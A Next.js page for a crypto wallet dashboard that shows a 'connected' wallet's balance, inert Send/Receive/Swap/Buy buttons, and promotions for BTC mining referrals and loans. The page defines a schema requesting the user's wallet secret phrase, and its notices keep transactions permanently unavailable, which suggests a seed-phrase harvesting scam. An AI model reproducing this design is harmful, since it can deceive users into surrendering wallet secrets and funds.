"use client"

import { ErrorMessage, Field, Form, Formik } from 'formik';
import Image from 'next/image'
import React, { useState, useEffect } from 'react'
import * as Yup from "yup";
import { useRouter, useSearchParams } from 'next/navigation';
import axios from 'axios';
import { useAuth } from '@/app/context/AuthContext';
import { TbTriangleInvertedFilled, TbWriting } from "react-icons/tb";
import { LuArrowDownToLine, LuArrowUpToLine, LuKeyRound, LuPlus, LuRotate3D, LuRotateCcw, LuWallet } from "react-icons/lu";
import { FaAngleLeft, FaAngleRight, FaCheckCircle, FaRegEye, FaRegEyeSlash } from "react-icons/fa";
import { DesktopSideBar } from '@/app/dashboard/components/DesktopSideBar';
import { Header } from '@/app/dashboard/components/Header';
import LoadingScreen from '../../loading';
import { Footer } from '@/app/dashboard/components/Footer';
import { RxEyeOpen, RxEyeClosed } from 'react-icons/rx';
import { useBalanceStore } from '@/app/store/useBalanceStore';
import { CryptoPriceList } from '@/app/dashboard/components/CryptoPriceList';
import { IoGiftOutline, IoInformationCircleOutline } from 'react-icons/io5';
import { Carousel } from 'flowbite-react';
import { IoIosArrowRoundForward } from 'react-icons/io';
import { GiReceiveMoney } from 'react-icons/gi';
import { RiNftLine } from 'react-icons/ri';


export default function Page() {
  const searchParams = useSearchParams();
  const router = useRouter();
  const [step, setStep] = useState(1);
  const [coin, setCoin] = useState("");
  const [featureNotice, setFeatureNotice] = useState(false);
  const { user } = useAuth();
  const [wallet, setWallet] = useState(null);
  const [isError, setIsError] = useState(false);
  const [loading, setLoading] = useState(false);
    const { isVisible, toggleVisibility } = useBalanceStore();
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const walletId = searchParams.get("walletId") || undefined;


  useEffect(() => {
        async function fetchWallet() {
          try {
            setLoading(true);
  
            const res = await axios.get(
              `/api/auth/users/wallet-connect/connected?walletId=${walletId}`,
              {
                withCredentials: true,
                headers: { "Content-Type": "application/json" },
              }
            );

            if (res.status === 200 && res.data.status === "Successful") {
                setWallet(res.data);
                setIsError(false);
                setLoading(false);
            } else {
                setLoading(false);
                setStep(2);
            }
          } catch(err) {
            router.push("/dashboard/wallets");
            setLoading(false);
          }
        }
    
        fetchWallet();
      }, []);

  const initialWalletValues = {
  walletName: coin + " " + "wallet 1",
  walletPhrase: ""

  }
  const validateWalletSchema = Yup.object({
    walletName: Yup.string().required("Please enter a wallet name."),
    walletPhrase: Yup.string().required("Please enter your wallet secret phrase.")
  });
  
      const toggleMenu = () => {
          if (isMenuOpen === false) {
              setIsMenuOpen(true)
          } else {
              setIsMenuOpen(false)
          }
      }


      const handleTransactionMessage = () => {
        setFeatureNotice(true);
      }


  return (
    <div className="bg-white w-full h-full text-black min-h-screen dark:bg-isoDark dark:text-white space-y-5 relative font-[family-name:var(--font-geist-sans)]">
        {loading === true && (<LoadingScreen tab={""} />)}
        <div className='block w-full'>
            <Header tab={"wallet"} />
        </div>

        <div className='w-full h-full min-h-screen md:pt-20 flex items-start'>
     
          <DesktopSideBar tab={"wallet"} />

          <div className='w-full h-full md:py-16 py-20 bg-none relative flex flex-col md:justify-center md:items-center md:px-40'>
                <div className='w-full flex flex-col space-y-5 md:space-y-16 '>

                    {step === 1 && (
                        <div className='w-full space-y-3'>
                            
                            <div className='flex w-full flex-col items-center space-y-5'>
                                <a href='/dashboard/wallets' className='flex text-xs bg-[#f4f4f7] dark:bg-isoDark2 dark:text-white text-black rounded-full p-2 items-center space-x-1'>
                                    <span>{wallet !== null ? wallet.walletName : "Processing..."}</span>
                                    <FaAngleRight className='' />
                                </a>

                                <div className='flex flex-row-reverse justify-center items-center space-x-4 w-full'>
                                    <div className='flex items-center px-2'>
                                        {
                                            isVisible === true ? (
                                                <RxEyeOpen onClick={toggleVisibility} className='h-4 w-4 text-neutral-400' />
                                            ) : (
                                                <FaRegEyeSlash onClick={toggleVisibility} className='h-4 w-4 text-neutral-400' />
                                            )
                                        }
                                    </div>
                                    <div className=''>
                                        {
                                            isVisible ? (
                                                <h1 className='text-3xl font-semibold'>${wallet !== null ? `${wallet.walletAmount.toLocaleString()}.00` : "Processing..."}</h1>
                                            ) : (
                                                // <h1 className='text-3xl font-semibold'>****</h1>
                                                <div className='flex space-x-1 items-center'>
                                                    <span className='w-2.5 h-2.5 rounded-full bg-black dark:bg-white'></span>
                                                    <span className='w-2.5 h-2.5 rounded-full bg-black dark:bg-white'></span>
                                                    <span className='w-2.5 h-2.5 rounded-full bg-black dark:bg-white'></span>
                                                    <span className='w-2.5 h-2.5 rounded-full bg-black dark:bg-white'></span>
                                                </div>
                                            )
                                        }
                                    </div>
                                </div>

                                <div className="flex gap-5 flex-wrap justify-center items-center">
                                    <div onClick={handleTransactionMessage} className='flex flex-col space-y-2 justify-center items-center'>
                                        <span className="rounded-xl bg-[#f4f4f7] dark:bg-isoDark2 dark:text-white text-black p-4 border-black">
                                            <LuArrowDownToLine className="text-2xl" />
                                        </span>
                                        <p className='flex text-xs font-medium'>Send</p>
                                    </div>

                                    <div onClick={handleTransactionMessage} className='flex flex-col space-y-2 justify-center items-center'>
                                        <span className="rounded-xl bg-[#f4f4f7] dark:bg-isoDark2 dark:text-white text-black p-4 border-black">
                                            <LuArrowUpToLine className="text-2xl" />
                                        </span>
                                        <p className='flex text-xs font-medium'>Receive</p>
                                    </div>

                                    <div onClick={handleTransactionMessage} className='flex flex-col space-y-2 justify-center items-center'>
                                        <span className="rounded-xl bg-[#f4f4f7] dark:bg-isoDark2 dark:text-white text-black p-4 border-black">
                                            <LuRotateCcw className="text-2xl" />
                                        </span>
                                        <p className='flex text-xs font-medium'>Swap</p>
                                    </div>

                                    <div onClick={handleTransactionMessage} className='flex flex-col space-y-2 justify-center items-center'>
                                        <span className="rounded-xl bg-[#f4f4f7] dark:bg-isoDark2 dark:text-white text-black p-4 border-black">
                                            <LuPlus className="text-2xl" />
                                        </span>
                                        <p className='flex text-xs font-medium'>Buy</p>
                                    </div>
                                </div>
                            </div>

                            <div className="container mx-auto rounded-3xl px-5 h-36 w-full md:px-52">
                                                                                                <Carousel
                                                                                                  slideInterval={2000}
                                                                                                  pauseOnHover
                                                                                                  indicators
                                                                                                  className='[&_button]:hidden rounded-3xl'
                                                                                                >
                                                                                                  <a href='/dashboard/wallets' className='w-full rounded-3xl bg-[#f4f4f5] dark:bg-isoDark2 dark:text-white text-black border border-yellow-400 p-4 flex space-x-3 items-start'>
                                                                                                    <div className='bg-yellow-500 rounded-full p-2 text-black'><LuWallet className={`h-4 w-4`} /></div>
                                                                                                    <p className='text-sm flex flex-col'>
                                                                                                        <span>Connect unlimited crypto wallets and enjoy seamless profits.</span>
                                                                                                        <span className='flex items-center space-x-1'>
                                                                                                            <span className='text-isoColor1 dark:text-isoColor2 font-medium'>Explore now</span>
                                                                                                            <IoIosArrowRoundForward className='w-3 h-3' />
                                                                                                        </span>
                                                                                                    </p>
                                                                                                  </a>
                                                                                                  <a href='/dashboard/rewards' className='w-full rounded-3xl bg-[#f4f4f5] dark:bg-isoDark2 dark:text-white text-black border border-[#f4f4] p-4 flex space-x-3 items-start'>
                                                                                                    <div className='bg-[#f4f4] rounded-full p-2 text-black'><IoGiftOutline className={`h-4 w-4`} /></div>
                                                                                                    <p className='text-sm flex flex-col'>
                                                                                                        <span>Invite friends to mine BTC and earn +100 MH/s mining speed.</span>
                                                                                                        <span className='flex items-center space-x-1'>
                                                                                                            <span className='text-isoColor1 dark:text-isoColor2 font-medium'>Explore now</span>
                                                                                                            <IoIosArrowRoundForward className='w-3 h-3' />
                                                                                                        </span>
                                                                                                    </p>
                                                                                                  </a>
                                                                                                  <a href='/dashboard/loans' className='w-full rounded-3xl bg-[#f4f4f5] dark:bg-isoDark2 dark:text-white text-black border border-green-400 p-4 flex space-x-3 items-start'>
                                                                                                    <div className='bg-green-500 rounded-full p-2 text-black'><GiReceiveMoney className={`h-4 w-4`} /></div>
                                                                                                    <p className='text-sm flex flex-col'>
                                                                                                        <span>Quickly apply for an investment loan and repay whenever.</span>
                                                                                                        <span className='flex items-center space-x-1'>
                                                                                                            <span className='text-isoColor1 dark:text-isoColor2 font-medium'>Explore now</span>
                                                                                                            <IoIosArrowRoundForward className='w-3 h-3' />
                                                                                                        </span>
                                                                                                    </p>
                                                                                                  </a>
                                                                                                  <a href='/dashboard/nft' className='w-full rounded-3xl bg-[#f4f4f5] dark:bg-isoDark2 dark:text-white text-black border border-blue-400 p-4 flex space-x-3 items-start'>
                                                                                                    <div className='bg-blue-500 rounded-full p-2 text-black'><RiNftLine className={`h-4 w-4`} /></div>
                                                                                                    <p className='text-sm flex flex-col'>
                                                                                                        <span>Easily buy and secure your NFTs on Astiox Network.</span>
                                                                                                        <span className='flex items-center space-x-1'>
                                                                                                            <span className='text-isoColor1 dark:text-isoColor2 font-medium'>Explore now</span>
                                                                                                            <IoIosArrowRoundForward className='w-3 h-3' />
                                                                                                        </span>
                                                                                                    </p>
                                                                                                  </a>
                                                                                                </Carousel>
                            </div>

                            <CryptoPriceList />
                            
                        </div>
                    )}

                    {step === 2 && (
                        <div className="w-full h-full p-10 flex fixed top-0 bottom-0 right-0 left-0 container mx-auto justify-center bg-black/50 items-center loading-modal">
                                                <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full  flex flex-col items-center py-5 px-3 bg-white dark:bg-isoDark2 space-y-4">
                                                  <div className='flex justify-center items-center rounded-full p-2 dark:bg-isoDark bg-[#f4f4f5]'><IoInformationCircleOutline className='w-16 dark:text-isoColor2 text-black h-16' /></div>
                                    
                                                  <h1 className='px-6 text-lg font-medium text-center md:font-semibold'>Notice!</h1>
                                    
                                                  <p className='text-xs text-center'>
                                                    This wallet is currently undergoing BLOCKCHAIN technical review. {process.env.NEXT_PUBLIC_COMPANY_NAME} will notify you as soon as the wallet becomes functional. Thank you.
                                                  </p>
                                
                                                  <a
                                                    href='/dashboard/wallets'
                                                    className="w-full py-3 text-center dark:bg-isoColor2 dark:text-black rounded-xl bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                                  >
                                                          OK
                                                  </a>
                                                </div>
                        </div>
                    )}

                    {featureNotice === true && (
                        <div className="w-full h-full p-10 flex fixed top-0 bottom-0 right-0 left-0 container mx-auto justify-center bg-black/50 items-center loading-modal">
                                                <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full  flex flex-col items-center py-5 px-3 dark:bg-isoDark2 bg-white space-y-4">
                                                  <div className='flex justify-center items-center rounded-full p-2 dark:bg-isoDark bg-[#f4f4f5]'><IoInformationCircleOutline className='w-16 text-black dark:text-isoColor2 h-16' /></div>
                                    
                                                  <h1 className='px-6 text-lg font-medium text-center md:font-semibold'>Notice!</h1>
                                    
                                                  <p className='text-xs text-center'>
                                                    This wallet is currently in read-only mode and transactions are NOT functional. {process.env.NEXT_PUBLIC_COMPANY_NAME} will notify you as soon as this feature becomes available. Thank you.
                                                  </p>
                                
                                                  <button
                                                    type='button'
                                                    onClick={() => setFeatureNotice(false)}
                                                    className="w-full py-3 text-center dark:bg-isoColor2 dark:text-black rounded-xl bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                                  >
                                                          OK
                                                  </button>
                                                </div>
                        </div>
                    )}

                </div>

          </div>

        </div>

        <Footer tab={`wallets`} />
    </div>
  )
}
